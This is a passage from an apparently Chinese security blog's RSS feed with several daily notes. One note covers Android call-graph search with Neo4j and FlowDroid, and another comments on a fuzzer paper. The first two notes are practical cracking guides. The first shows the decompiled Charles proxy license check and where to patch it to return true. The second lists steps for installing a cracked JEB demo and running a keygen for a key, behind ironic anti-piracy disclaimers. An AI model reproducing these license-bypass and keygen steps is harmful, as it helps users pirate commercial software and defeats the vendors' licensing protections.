        super(paramFrame, true);
        setTitle(&quot;Register Charles&quot;);
        this.tName = new JTextField(20);
        this.tSerial = new JTextField(20);
        this.bRegister = new JButton(&quot;Register&quot;);
        this.bCancel = new JButton(&quot;Cancel&quot;);
        Container container;
        (container = getContentPane()).setLayout(new MigLayout(&quot;wrap,fill&quot;, &quot;[label][fill,grow]&quot;));
        container.add(new JLabel(&quot;Registered Name:&quot;));
        container.add(this.tName);
        container.add(new JLabel(&quot;License Key:&quot;));
        container.add(this.tSerial);
        container.add(this.bCancel, &quot;tag cancel,split 2,span,center&quot;);
        container.add(this.bRegister, &quot;tag ok&quot;);
        this.bCancel.addActionListener(new ohaK(this));
        // 注册按钮点击事件
        this.bRegister.addActionListener(new ZUnA(this));
        pack();
        if (paramFrame != null) {
            Point point;
            (point = new Point(paramFrame.getLocation())).translate(20, 20);
            setLocation(point);
        } 
        getRootPane().setDefaultButton(this.bRegister);
        getRootPane().getInputMap(1).put(KeyStroke.getKeyStroke(&quot;ESCAPE&quot;), &quot;escape&quot;);
        getRootPane().getActionMap().put(&quot;escape&quot;, new RegisterFrame$3(this));
    }
  
    public static void main(String[] paramArrayOfString) { 
    (new RegisterFrame(null)).setVisible(true); 
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZUnA&lt;/code&gt;调用方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bvcn.FwRs()&lt;/code&gt;判断序列号是否合法，返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt;表示注册成功，返回其它表示注册失败&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;final class ZUnA implements ActionListener {
    ZUnA(RegisterFrame paramRegisterFrame) {}
  
    public final void actionPerformed(ActionEvent paramActionEvent) {
        String str1 = RegisterFrame.FwRs(this.FwRs).getText().trim(); // 获取用户名输入框字符串
        String str2 = RegisterFrame.GSXJ(this.FwRs).getText().trim(); // 获取序列号输入框字符串
        if (str1.length() &amp;gt; 0 &amp;amp;&amp;amp; str2.length() &amp;gt; 0) { // 判断两个字符串长度
            String str;
            if ((str = Bvcn.FwRs(str1, str2)) != null) { 
                // 注册失败
                ExtendedJOptionPane.FwRs(this.FwRs, str, &quot;Charles Registration&quot;, 2);
                return;
            }
            // 注册成功
            ExtendedJOptionPane.FwRs(this.FwRs, &quot;Thank you for registering. Charles will now close. Please start Charles again to continue.&quot;, &quot;Charles Registration&quot;, 1);
            CharlesContext charlesContext;
            (charlesContext = CharlesContext.getInstance()).getConfiguration().getRegistrationConfiguration().setName(str1);
            charlesContext.getConfiguration().getRegistrationConfiguration().setKey(str2);
            charlesContext.exit(0, true);
        } 
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以我们重点关注方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bvcn.FwRs(String, String)&lt;/code&gt;，如果构造&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bvcn&lt;/code&gt;对象没有出问题，就会返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt;，所以校验逻辑肯定在类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bcvn&lt;/code&gt;的构造函数里&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static String FwRs(String paramString1, String paramString2) {
    try {
        Bvcn bvcn = new Bvcn(paramString1, paramString2);
    } catch (LicenseException licenseException) {
        return (paramString1 = null).getMessage();
    } 
    GSXJ = paramString1 = paramString1;
    return null;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么爆破的思路就在这里了&lt;/p&gt;

&lt;p&gt;再处理一下入口十秒倒计时的问题就可以用了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FACE27CCDB9A2EF743E71F5AD3554AC8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;即可&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static boolean FwRs() {
    Bvcn bvcn;
    return (bvcn = GSXJ).InuZ;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里改为显示在界面上的用户名&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static String InuZ() {
    Bvcn bvcn = GSXJ;
    switch (ohaK.FwRs[bvcn.KRBh.ordinal()]) {
        case 1:
            return bvcn.Gwbn;
        case 2:
            return bvcn.Gwbn + &quot; - Site License&quot;;
        case 3:
            return bvcn.Gwbn + &quot; - Multi-Site License&quot;;
    } 
    return bvcn.Gwbn;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;毕竟爆破毕竟还是挫了一些，后面是RC5加解密操作进行逻辑校验，有兴趣的可以研究一下，P和Q的补码表示形式如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hex(-1209970333 &amp;amp; 0xffffffff)
'0xb7e15163'
&amp;gt;&amp;gt;&amp;gt; hex(-1640531527 &amp;amp; 0xffffffff)
'0x9e3779b9'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我不是老中医，也不是老司机，只是习惯性的优化某些软件的使用体验&lt;/p&gt;
</description>
                <pubDate>Fri, 08 May 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/05/08/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.05.08.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/05/08/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.05.08.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.04.22</title>
                <description>&lt;p&gt;有个好消息，有JEB 3.17 Demo的破解版了&lt;/p&gt;

&lt;p&gt;我就是下载下来分析看看有没有病毒夹带，本人坚决反对使用盗版软件的行为！&lt;/p&gt;

&lt;p&gt;如果有和我一样也是想分析下是否有病毒，可以按照下面的步骤&lt;/p&gt;

&lt;p&gt;首先下载压缩包，打开后有两个压缩包，分别解压缩，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fixed&lt;/code&gt;文件夹下的两个文件替换&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bin/app&lt;/code&gt;目录下的两个同名文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  JEB 3.17.1 Anti-Covid19 Edition by DimitarSerg tree
.
├── RLZ
│   ├── fixed
│   │   │   ├── jeb.jar
│   │   │   ├── jebc.jar
│   └── kg_1337.jar
├── RLZ.zip
├── jeb-demo-3.17.1.202004121849-JEBDecompilerDemo-121820464987384330
│   ├── bin
│   │   ├── VERSION.TXT
│   │   ├── app
│   │   │   ├── jeb.jar
│   │   │   ├── jebc.jar
└── jeb-demo-3.17.1.202004121849-JEBDecompilerDemo-121820464987384330.zip

30 directories, 531 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;替换完成后根据平台运行对应的启动文件，注册的时候选择第一个按钮，然后运行kg_1337.jar即可获得key，拷贝进去即可完成注册&lt;/p&gt;

&lt;p&gt;保护正版，人人有责，让我们向盗版说不！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D38AF948D931DDB7B12D73FB0E720CE0.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;保护正版，人人有责，让我们向盗版说不！&lt;/p&gt;

&lt;p&gt;阿里发布了《Java开发手册 泰山版》，好好看一下，我粗略看过上一版的，一直用的阿里的IDEA检测插件，改了我不少写Java的坏习惯&lt;/p&gt;

&lt;p&gt;我一直对阿里有莫名的好感，如果有机会，我这辈子一定要去阿里工作，这里的阿里包括蚂蚁金服等泛指&lt;/p&gt;

&lt;p&gt;剩下想去的公司：Tencent，Google，MS，Apple，Dropbox，Facebook等&lt;/p&gt;

&lt;p&gt;腾讯和阿里一样，都是莫名的有好感，TSRC和AFSRC是我唯二有好感的SRC，其它的SRC都是垃圾&lt;/p&gt;

&lt;p&gt;虽然我菜，但是我做白日梦强啊:)&lt;/p&gt;

&lt;p&gt;这两天学习了一个经验：对于自己培养起来的新人一定要在两年之际仔细聊一下，一是薪资倒挂问题，二是工作情况，不然刚培养起来能干活了因为干的不爽钱又给的不够就被别的厂财大气粗挖走了，亏不？&lt;/p&gt;
</description>
                <pubDate>Wed, 22 Apr 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/04/22/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.22.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/04/22/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.22.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.04.20</title>
                <description>&lt;p&gt;这篇文章会涉及一些基础的图论名词，但都简单易懂，且只聊思路，并不涉及太多的代码，请放心阅读&lt;/p&gt;

&lt;p&gt;周末做了两件事&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;优化了Neo4j的搜索逻辑&lt;/li&gt;
  &lt;li&gt;在李神探的指导下，很快跑通了FlowDroid&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;先讲讲Neo4j的搜索，用AndroGuard生成函数调用图，这个图是以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edge&lt;/code&gt;的形式存储在GML文件里，表示形式如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;node [
    id 143
    label &quot;Lcom/wnagzihxa1n/myapplication/MainActivity;-&amp;gt;onCreate(Landroid/os/Bundle;)V [access_flags=protected] @ 0x10a98&quot;
    external False
    entrypoint True
]

node [
    id 144
    label &quot;Lcom/wnagzihxa1n/myapplication/MainActivity;-&amp;gt;startActivity(Landroid/content/Intent;)V&quot;
    external True
    entrypoint True
]

edge [
    source 143
    target 144
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这就表示了从节点&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;143&lt;/code&gt;到节点&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;144&lt;/code&gt;有一条边，这些节点和边的定义构成了一个有向图&lt;/p&gt;

&lt;p&gt;我们只需要解析GML文件，将节点和边导入Neo4j数据库，再进行路径搜索即可&lt;/p&gt;

&lt;p&gt;效果还是很好的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FE523B0E24B64601FB9FC22FDE156A99.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;为什么我一开始说的是优化搜索逻辑呢？&lt;/p&gt;

&lt;p&gt;因为这些工作其实早就做完了，并不是周末做的，上面的搜索相当耗时，单位都是小时来计算，我看看弄一台服务器来跑&lt;/p&gt;

&lt;p&gt;在图够准确的情况下，我将两个小时的搜索压缩到了一分钟以内&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;优化一&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;首先我们将GML重写，将所有节点解析成一行，然后申请内存，此处用C语言写，将数据存储在内存里，用结构体存储节点，并且我们只需要&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;label&lt;/code&gt;两个结构体成员&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;node [ id 0 label &quot;Landroidx/activity/R$attr;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe4e4&quot; ]
node [ id 1 label &quot;Ljava/lang/Object;-&amp;gt;&amp;lt;init&amp;gt;()V&quot; ]
node [ id 2 label &quot;Landroidx/activity/R$color;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe4fc&quot; ]
node [ id 3 label &quot;Landroidx/activity/R$dimen;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe514&quot; ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将所有节点写入内存，这里小几十万个节点写入堆完全没问题的&lt;/p&gt;

&lt;p&gt;但是这里的写，并不是随便申请堆空间吭哧吭哧就往里面写，而是利用偏移存储&lt;/p&gt;

&lt;p&gt;我们在进行GML重写的时候大概计算一下所有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;label&lt;/code&gt;字段拼接的长度，有了这一长度数据，我们就可以在堆空间申请的时候有一个大概的参考&lt;/p&gt;

&lt;p&gt;申请&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;label&lt;/code&gt;堆空间之后，我们申请所有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Node&lt;/code&gt;结构体的堆空间，都申请好之后，开始写入数据&lt;/p&gt;

&lt;p&gt;这里我们将结构体的概念去除，完全靠偏移，从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Node&lt;/code&gt;结构体的堆首地址开始往下写，使用一个额外的读指针指向&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;label&lt;/code&gt;堆空间&lt;/p&gt;

&lt;p&gt;第一个Node：写入第一个节点的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;，第二个字段是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;label&lt;/code&gt;堆空间的首地址，写完&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;label&lt;/code&gt;堆空间将指针挪动，并且记录堆地址起点&lt;/p&gt;

&lt;p&gt;第二个Node：写入第二个节点的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;，第二个字段直接赋值为上面记录的新堆地址起点，重复上面的挪动过程&lt;/p&gt;

&lt;p&gt;后面的节点按照上面的操作记录即可&lt;/p&gt;

&lt;p&gt;此时我们分割&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Node&lt;/code&gt;结构体的堆空间，长度按照大家的运行平台计算，但是每个结构体所占用的长度肯定是固定的&lt;/p&gt;

&lt;p&gt;比如我这里需要获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;为1000的结构体，那么从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Node&lt;/code&gt;结构体堆空间起始地址开始，算上一千个结构体长度，就是我们需要的节点，对其进行取值即可，这是我用来存储的方式&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;优化二&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;实践过的同学都会发现一个问题，就是冗余的节点和边实在是太多了，又用不到，徒增性能开销&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;node [ id 0 label &quot;Landroidx/activity/R$attr;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe4e4&quot; ]
node [ id 1 label &quot;Ljava/lang/Object;-&amp;gt;&amp;lt;init&amp;gt;()V&quot; ]
node [ id 2 label &quot;Landroidx/activity/R$color;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe4fc&quot; ]
node [ id 3 label &quot;Landroidx/activity/R$dimen;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe514&quot; ]
node [ id 4 label &quot;Landroidx/activity/R$drawable;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe52c&quot; ]
node [ id 5 label &quot;Landroidx/activity/R$id;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe544&quot; ]
node [ id 6 label &quot;Landroidx/activity/R$integer;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe55c&quot; ]
node [ id 7 label &quot;Landroidx/activity/R$layout;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe574&quot; ]
node [ id 8 label &quot;Landroidx/activity/R$string;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe58c&quot; ]
node [ id 9 label &quot;Landroidx/activity/R$style;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe6d0&quot; ]
node [ id 10 label &quot;Landroidx/activity/R$styleable;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe6b8&quot; ]
node [ id 11 label &quot;Landroidx/activity/R;-&amp;gt;&amp;lt;init&amp;gt;()V [access_flags=private constructor] @ 0xe6e8&quot; ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;既然重写，那就重写的更彻底一些，我决定缩点，这里的缩点并非图论里的缩点，但是思想类似&lt;/p&gt;

&lt;p&gt;我这里的缩点有两步&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;将入度和出度都为0的节点优化掉&lt;/li&gt;
  &lt;li&gt;将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;系统库内调用&lt;/code&gt;的节点优化掉&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;第一个缩点很好理解，有向图的节点入度和出度都为0表示没有边，没有边的节点表示没有调用，直接删除&lt;/p&gt;

&lt;p&gt;第二个缩点我们以代码来看，节点&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7093&lt;/code&gt;指向了节点&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7010&lt;/code&gt;，系统库内的调用对我们来说是没有意义的，所以我们可以进行动态标记，先将所有的边遍历一遍，把系统库内函数为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt;的边，全部删除&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;node [
    id 7093
    label &quot;Landroid/support/v4/provider/TreeDocumentFile;-&amp;gt;createDirectory(Ljava/lang/String;)Landroid/support/v4/provider/DocumentFile; [access_flags=public] @ 0x1ca25c&quot;
    external False
    entrypoint False
]
  
node [
    id 7010
    label &quot;Landroid/support/v4/provider/TreeDocumentFile;-&amp;gt;&amp;lt;init&amp;gt;(Landroid/support/v4/provider/DocumentFile; Landroid/content/Context; Landroid/net/Uri;)V [access_flags=constructor] @ 0x1ca1f4&quot;
    external False
    entrypoint False
]
  
edge [
    source 7093
    target 7010
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里是否有例外呢？我还不能肯定，还请师傅们指点&lt;/p&gt;

&lt;p&gt;补充有向图的三个概念&lt;/p&gt;

&lt;p&gt;强连通：有向图G存在节点A和节点B，节点A有一条路径可以到达节点B，节点B有一条路径可以到达节点A，就叫作两个节点强连通&lt;/p&gt;

&lt;p&gt;强连通图：有向图G中任意两个节点都强连通，就叫作强连通图&lt;/p&gt;

&lt;p&gt;强连通分量：有向图G中有一个子图，这个子图满足任意两个节点强连通，就叫作强连通分量&lt;/p&gt;

&lt;p&gt;有向图的缩点是指求出有向图G所有强连通分量之后，将每一个强连通分量以一个节点的形式来表示，重构有向图G的过程&lt;/p&gt;

&lt;p&gt;思路我已经抛出来了，大家可以思考下是否能通过图论里的缩点思想，来实现路径搜索优化呢？&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;优化三&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;此时我们就可以开始构建图了，这个优化我先不说，而我用了什么方法，我相信聪明的读者看到我上面的存储方式，就已经猜到了:)&lt;/p&gt;

&lt;p&gt;上面为什么我说”图够准确”呢？&lt;/p&gt;

&lt;p&gt;因为安卓平台的应用存在大量的回调操作，比如控件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Button&lt;/code&gt;的点击事件，而&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AndroGuard&lt;/code&gt;默认并未生成绑定监听相关的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edge&lt;/code&gt;，这就造成了可能的误报和漏报&lt;/p&gt;

&lt;p&gt;来看一个通过按钮点击跳转Activity的例子&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    
    ...
    
    v0_3.setOnClickListener(new bc(this));  // 此处绑定点击事件回调
    
    ...
}

final class bc implements View$OnClickListener {
    bc(SelectVideoActivity argActivity) {
        this.activity = argActivity;
        super();
    }

    public final void onClick(View view) {
        Intent intent = new Intent();
        intent.setClass(this.activity, SearchPagerActivity.class);
        this.activity.startActivity(intent);
        MTAReport.reportUserEvent(&quot;video_jce_circle_search_btn&quot;, new String[0]);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对应的GML文件相关数据如下，可以看到有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onClick()&lt;/code&gt;指向&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivity()&lt;/code&gt;的边，但是却没有指向回调函数的边&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;node [
    id 107682
    label &quot;Lcom/tencent/qqlive/ona/circle/activity/SelectVideoActivity;-&amp;gt;onCreate(Landroid/os/Bundle;)V [access_flags=protected] @ 0x6047ac&quot;
    external False
    entrypoint True
]

node [
    id 107914
    label &quot;Lcom/tencent/qqlive/ona/circle/activity/bc;-&amp;gt;onClick(Landroid/view/View;)V [access_flags=public final] @ 0x607c5c&quot;
    external False
    entrypoint False
]

node [
    id 107697
    label &quot;Lcom/tencent/qqlive/ona/circle/activity/SelectVideoActivity;-&amp;gt;startActivity(Landroid/content/Intent;)V&quot;
    external True
    entrypoint True
]

edge [
    source 107914
    target 107697
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对于这种问题，我决定自己优化&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AndroGuard&lt;/code&gt;的生成结果&lt;/p&gt;

&lt;p&gt;上面这个例子对应的Smali代码如下，JEB和APKTool的结果略有出入，但不影响分析，可以看到调用关系还是很清晰的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/19A07B80C6DC715C12AB9A4B7D05698D.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们最后处理的时候以APKTool反编译的Smali代码为准，我们不用关心这个点击事件回调绑定的哪个控件，只要存在，就把这条边记录下来&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.line 1167
new-instance v1, Lcom/tencent/qqlive/ona/circle/activity/bc;

invoke-direct {v1, p0}, Lcom/tencent/qqlive/ona/circle/activity/bc;-&amp;gt;&amp;lt;init&amp;gt;(Lcom/tencent/qqlive/ona/circle/activity/SelectVideoActivity;)V

invoke-virtual {v0, v1}, Landroid/view/View;-&amp;gt;setOnClickListener(Landroid/view/View$OnClickListener;)V
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;路漫漫其修远兮，这是一项体力活&lt;/p&gt;

&lt;p&gt;FlowDroid的工作说起来可就优雅多了&lt;/p&gt;

&lt;p&gt;从官方的仓库获取代码，配置两个环境变量，然后&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mvn install&lt;/code&gt;就行了，虽然会有若干错误，还是比较容易解决的&lt;/p&gt;

&lt;p&gt;中间最关键的一步就是切换到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt;分支，要解决的错误少多了&lt;/p&gt;

&lt;p&gt;接下来我就投入精力到与FlowDroid运行效率作斗争的工作中&lt;/p&gt;

&lt;p&gt;就如同李神探所说，如果能够在已有FlowDroid框架上进行优化到一分钟，都可以发Paper了&lt;/p&gt;

&lt;p&gt;所以说当别人提出一些想法的时候，不要着急否定，你怎么知道我一口吃不成个大胖子呢？&lt;/p&gt;

&lt;p&gt;有时候不多认识些优秀的同龄人，都不知道自己原来这么弱&lt;/p&gt;
</description>
                <pubDate>Mon, 20 Apr 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/04/20/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.20.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/04/20/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.20.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.04.17</title>
                <description>&lt;p&gt;这两天看了篇很优秀的Fuzzer论文，大佬优秀&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://netsec.ccert.edu.cn/files/papers/sec20-fans.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;期待开源&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/80215C4C064303013A2411486FD5316B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;具体的内容有兴趣的同学可以自行下载论文阅读，有一些地方我还没有理解的很透彻，等我觉得理解透彻了我再把笔记分享一下，比如我来实现作者说的这些模块，我会如何构建框架&lt;/p&gt;

&lt;p&gt;我前段时间提到的我写的工具，参考了Jandroid，在测试效果，感觉还是可以的，纯逻辑已经可以搜索了，双向遍历图&lt;/p&gt;

&lt;p&gt;先尝试着用多年之前给鹅厂报的一个任意Activity调用漏洞进行测试，可以成功扫出来&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/493D1DDBADBF24343A92E5B03E7D9ACA.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们知道，从一个导出的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Activity.onCreate()&lt;/code&gt;开始，下面可能就像一颗树一样，层层调用，错综复杂，如果我们能够提前先把关键的函数调用路径给搜索出来，岂不是美美哒，整体来说效果还行&lt;/p&gt;

&lt;p&gt;我目前正在添加其它像回调相关的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edge&lt;/code&gt;，还有多线程等，这东西缺点也明显，就是慢，我想了个方法来优化，总体来说还行吧，至少不会迷失在层层调用里了，只需要跟着打印出来的逻辑走一波看看执行的条件即可&lt;/p&gt;

&lt;p&gt;我还看了一篇女神的硕士学位论文《互聯網時代藝人轉型策略之初探性研究： 以徐若瑄為例》，看完挺感动的，就如同致谢里描述的能在四十不惑的阶段实现硕士梦想，这样的学习精神值得点赞，写的真的很好&lt;/p&gt;

&lt;p&gt;能一直有优秀的知识来学习真的幸福，再次感谢潜心研究并且乐于分享的各位师傅们:)&lt;/p&gt;

&lt;p&gt;机会像雨点般向我袭来，可是我撑了把伞&lt;/p&gt;

&lt;p&gt;挑战和安逸，终归还是选择了稳定的安逸，如果若干年后让我总结一下我的安全生涯，一句话就可以概括：看着身边的师傅们拼命学习努力挖漏洞开上Porsche的过程&lt;/p&gt;

&lt;p&gt;最后，在线等，急&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EDF708E08D609A2464B760E11927B1B7.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Fri, 17 Apr 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/04/17/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.17.html</link>
